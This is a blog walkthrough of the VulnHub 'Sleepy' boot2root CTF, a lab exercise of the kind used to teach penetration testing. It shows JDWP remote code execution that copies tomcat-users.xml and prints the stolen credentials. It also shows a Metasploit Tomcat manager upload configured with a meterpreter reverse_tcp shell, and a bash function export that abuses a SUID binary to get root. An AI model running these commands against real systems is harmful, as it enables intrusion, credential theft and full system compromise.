---
layout: blog_item
title: "/dev/random: Sleepy Walkthrough CTF"
date: "2015-11-26 23:12:52 +0200"
author: Arr0way
categories: [walkthroughs]
description: "/dev/random: Sleepy walkthrough - step by step walkthrough for Sleepy a VulnHub Boot2Root CTF challenge."
---

<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p></i><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}


##  Description

**Sleepy** is part of the /dev/random: series created by Sagi-, it's a little more difficult than [Pipe](/blog/pipe-ctf-walkthrough/) depending on what you're skill set.

**Author:** [@s4gi_ ](https://twitter.com/s4gi_ )

**Download:** [/dev/random: Sleepy](https://www.vulnhub.com/entry/devrandom-sleepy,123/) via [@VulnHub](https://twitter.com/VulnHub)

{% highlight bash %}
_________.__                              
/   _____/|  |   ____   ____ ______ ___.__.
\_____  \ |  | _/ __ \_/ __ \\____ <   |  |
/        \|  |_\  ___/\  ___/|  |_> >___  |
/_______  /|____/\___  >\___  >   __// ____| ·VM·
      \/           \/     \/|__|   \/


{% endhighlight %}



##Enumeration

{% highlight bash %}
[root:~]# nmap -v -p 1-65535 -sV -O -sT 192.168.30.146

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 2.0.8 or later
8009/tcp open  ajp13   syn-ack Apache Jserv (Protocol v1.3)
9001/tcp open  jdwp    syn-ack Java Debug Wire Protocol (Reference Implementation) version 1.6 1.7.0_71
MAC Address: 00:0C:29:8C:41:F7 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Uptime guess: 49.709 days (since Wed Oct  7 20:28:44 2015)

{% endhighlight %}

###Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 21</code></p></pc>
           </td>
           <td>
               <pc><p>FTP</p></pc>
           </td>
           <td>
               <pc><p>vsftpd 2.0.8 or later</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 8009</code></p></pc>
           </td>
           <td>
              <pc><p>ajp13</p></pc>
           </td>
           <td>
               <pc><p>Apache Jserv (Protocol v1.3)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 9001</code></p></pc>
           </td>
           <td>
              <pc><p>jdwp</p></pc>
           </td>
           <td>
               <pc><p>Java Debug Wire Protocol version 1.6 1.7.0_71</p></pc>
           </td>
        </tr>
      </tbody>
</table>
</div>

###FTP Enumeration

As nmap  indicated, FTP had anonymous access enabled. Interrogation of the service revealed <code>/pub/sleepy.png </code>

![base64 image](/img/blog/sleepy/sleepy.png)

### JServ Enumeration

JServ protocol is exposed with no web server proxy, JServ acts as a proxy and requires a web server to proxy it's requests.

### JDWP Enumeration

Unauthenticated JDWP is exposed:

{% highlight bash %}
[root]# jdb -attach 192.168.30.146:9001
{% endhighlight %}

Research indicated it was possible to interrupt threads, with the command: <code>interupt</code> allowing for arbitrary code execution.  

{% highlight bash %}

[root]# jdb -attach 192.168.30.146:9001                                                                                                                                                 
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> threads
Group system:
  (java.lang.ref.Reference$ReferenceHandler)0x19d Reference Handler cond. waiting
  (java.lang.ref.Finalizer$FinalizerThread)0x19e  Finalizer         cond. waiting
  (java.lang.Thread)0x19f                         Signal Dispatcher running
Group main:
  (java.lang.Thread)0x1a1                         main              sleeping
> interrupt 0x1a1
>
Exception occurred: java.lang.InterruptedException (uncaught)"thread=main", java.lang.Thread.sleep(), line=-1 bci=-1

main[1] print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/").getInputStream())).readLine())
java.lang.NullPointerException
	at com.sun.tools.example.debug.expr.LValue.argumentsMatch(LValue.java:268)
	at com.sun.tools.example.debug.expr.LValue.resolveOverload(LValue.java:399)
	at com.sun.tools.example.debug.expr.LValue.makeNewObject(LValue.java:820)
	at com.sun.tools.example.debug.expr.ExpressionParser.AllocationExpression(ExpressionParser.java:1119)
	at com.sun.tools.example.debug.expr.ExpressionParser.PrimaryPrefix(ExpressionParser.java:961)
	at com.sun.tools.example.debug.expr.ExpressionParser.PrimaryExpression(ExpressionParser.java:909)
	at com.sun.tools.example.debug.expr.ExpressionParser.PostfixExpression(ExpressionParser.java:834)
	at com.sun.tools.example.debug.expr.ExpressionParser.UnaryExpressionNotPlusMinus(ExpressionParser.java:757)
	at com.sun.tools.example.debug.expr.ExpressionParser.UnaryExpression(ExpressionParser.java:687)
	at com.sun.tools.example.debug.expr.ExpressionParser.MultiplicativeExpression(ExpressionParser.java:611)
	at com.sun.tools.example.debug.expr.ExpressionParser.AdditiveExpression(ExpressionParser.java:580)
	at com.sun.tools.example.debug.expr.ExpressionParser.ShiftExpression(ExpressionParser.java:542)
	at com.sun.tools.example.debug.expr.ExpressionParser.RelationalExpression(ExpressionParser.java:504)
	at com.sun.tools.example.debug.expr.ExpressionParser.InstanceOfExpression(ExpressionParser.java:485)
	at com.sun.tools.example.debug.expr.ExpressionParser.EqualityExpression(ExpressionParser.java:455)
	at com.sun.tools.example.debug.expr.ExpressionParser.AndExpression(ExpressionParser.java:433)
	at com.sun.tools.example.debug.expr.ExpressionParser.ExclusiveOrExpression(ExpressionParser.java:412)
	at com.sun.tools.example.debug.expr.ExpressionParser.InclusiveOrExpression(ExpressionParser.java:391)
	at com.sun.tools.example.debug.expr.ExpressionParser.ConditionalAndExpression(ExpressionParser.java:370)
	at com.sun.tools.example.debug.expr.ExpressionParser.ConditionalOrExpression(ExpressionParser.java:349)
	at com.sun.tools.example.debug.expr.ExpressionParser.ConditionalExpression(ExpressionParser.java:321)
	at com.sun.tools.example.debug.expr.ExpressionParser.Expression(ExpressionParser.java:256)
	at com.sun.tools.example.debug.expr.ExpressionParser.evaluate(ExpressionParser.java:81)
	at com.sun.tools.example.debug.tty.Commands.evaluate(Commands.java:114)
	at com.sun.tools.example.debug.tty.Commands.doPrint(Commands.java:1654)
	at com.sun.tools.example.debug.tty.Commands$3.action(Commands.java:1680)
	at com.sun.tools.example.debug.tty.Commands$AsyncExecution$1.run(Commands.java:66)
 new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/").getInputStream())).readLine()) = null
main[1] exit

{% endhighlight %}

The Java code above copied the <code>/etc/tomcat/tomcat-users.xml</code> file to <code>/var/ftp/pub</code>. The default location for pub ftp on CentOS.

tomcat-users.xml was download to the attacking machine and the following credentials were extracted:

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Username</th>
      <th>Password</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>sl33py</code></p></pc>
           </td>
           <td>
               <pc><p><code>Gu3SSmYStR0NgPa$sw0rD!</code></p></pc>
           </td>
        </tr>
      </tbody>
</table>
</div>

Full tomcat-users.xml file for completeness:

{% highlight xml %}
<?xml version='1.0' encoding='utf-8'?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users>
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.
-->
<!--
  NOTE:  The sample user and role entries below are wrapped in a comment
  and thus are ignored when reading this file. Do not forget to remove
  <!.. ..> that surrounds them.
-->
  <role rolename="tomcat"/>
  <role rolename="role1"/>
 <!-- <user username="tomcat" password="tomcat" roles="tomcat,manager-gui,admin,manager-jmx,admin-gui,admin-script,manager,manager-script,manager-status"/> -->
  <user username="both" password="tomcat" roles="tomcat,role1"/>
  <user username="role1" password="tomcat" roles="role1"/>

<role rolename="admin"/>
 <role rolename="admin-gui"/>
 <role rolename="admin-script"/>
 <role rolename="manager"/>
<role rolename="manager-gui"/>
 <role rolename="manager-script"/>
<role rolename="manager-jmx"/>
 <role rolename="manager-status"/>
<!-- <user name="admin" password="adminadmin" roles="admin,manager,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status" /> -->


<user username="sl33py" password="Gu3SSmYStR0NgPa$sw0rD!" roles="tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status"/>

</tomcat-users>
{% endhighlight %}


## Apache Tomcat JServ Proxy setup

During enumeration JServ protocol was discovered exposed on the default port <code>TCP: 8009</code>. A local Apache proxy was setup on the attacking machine proxying requests back to the target JServ application server.

Script for automation for JServ Proxy on Attacking machine:

{% highlight bash %}
#!/bin/bash
apt-get install libapache2-mod-jk -y
sed -i 's#JkWorkersFile /etc/libapache2-mod-jk/workers.properties#JkWorkersFile /etc/apache2/workers.properties#g' /etc/apache2/mods-enabled/jk.conf
cp /etc/libapache2-mod-jk/workers.properties /etc/apache2/
sed -i 's#worker.ajp13_worker.host=localhost#worker.ajp13_worker.host=192.168.30.146#g' /etc/apache2/workers.properties
sed  '/\Host\>/i JKMount /* ajp13_worker' /etc/apache2/sites-enabled/000-default.conf
a2enmod proxy_http proxy_ajp
service apache2 restart
{% endhighlight %}

Tomcat should now be exposed with visiting <code>http://127.0.0.1</code> in **Firefox**.

![Tomcat JServ Apache Proxy](/img/blog/sleepy/tomcat-jserv-apache-proxy.png)

## Remote Exploitation

**Tomcat** is now exposed and login credentials have been obtained, it's now possible to login via Tomcat Manager and leverage a shell via Metasploit.

TIP: You'll need: <code>set FingerprintCheck false</code>

<div class="note info">
  <h5>FingerprintCheck</h5>
  <p>The option: <code>set FingerprintCheck false</code> needs to be configured or meterpreter will throw the following error:</p>
  <p><code>[-] [2015.11.26-13:17:44] Exploit aborted due to failure: not-found: The target <br> server fingerprint "Apache/2.4.10 (Debian)" does not match "(?-mix:Apache.*(Coyote|<br>Tomcat))", use 'set FingerprintCheck false' to disable this check.</code></p>
</div>

{% highlight bash %}
msf exploit(tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name       Current Setting         Required  Description
   ----       ---------------         --------  -----------
   PASSWORD   Gu3SSmYStR0NgPa$sw0rD!  no        The password for the specified username
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      0.0.0.0                 yes       The target address
   RPORT      80                      yes       The target port
   TARGETURI  /manager                yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   USERNAME   sl33py                  no        The username to authenticate as
   VHOST                              no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.30.134   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal
{% endhighlight %}

### Meterpreter Shell

An unprivileged meterpreter shell was obtained:

![meterpreter shell](/img/blog/sleepy/meterpreter.png)

## Local Privilege Escalation

### Enumeration

Searching for SUID files discovered a binary called <code>nightmare</code>.

{% highlight bash %}
bash-4.2$ find / -user root -perm -4000 -print 2> /dev/null
find / -user root -perm -4000 -print 2> /dev/null
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/nightmare
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib64/dbus-1/dbus-daemon-launch-helper
{% endhighlight %}

### Binary Interrogation

The <code>nightmare</code> binary was copied to the attacking machine and interrogated with strings.

![nightmare binary strings](/img/blog/sleepy/strings.png)

The binary <code>nightmare</code> appears to execute <code>/user/bin/sl</code> as the root user (SUID is on the execute bit).

### Bash Function Manipulation

Function manipulation was leveraged to execute <code>/bin/sh</code> by the nightmare binary, providing a root shell thus fully compromising the system.

<div class="note warning">
  <h5>Nightmare Process</h5>
  <p>After execution of <code>/usr/bin/nightmare</code> it was necessary to kill the <code>nightmare</code> process using <code>kill -2</code> via another shell in order for the root shell to spawn correctly. To search for the process use <code>ps aux | grep nightmare</code> and use <code>kill -2</code> command to kill the pid.</p>
</div>


{% highlight bash %}
meterpreter > shell
Process 11 created.
Channel 14 created.


python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.2$

bash-4.2$

bash-4.2$ function /usr/bin/sl() { /bin/sh; }
function /usr/bin/sl() { /bin/sh; }
bash-4.2$ export -f /usr/bin/sl
export -f /usr/bin/sl
bash-4.2$ /usr/bin/nightmare
/usr/bin/nightmare
Error opening terminal: unknown.
[+] Again [y/n]? sh-4.2# id
id
uid=0(root) gid=0(root) groups=0(root),91(tomcat) context=system_u:system_r:tomcat_t:s0
sh-4.2# cat /root/flag.txt
cat /root/flag.txt
Well done!

Here's your flag: 3eb030c6ab099b0a355712fe38d59ffb
{% endhighlight %}

### Root Flag

![nightmare binary strings](/img/blog/sleepy/strings.png)


Thanks for the VM :)
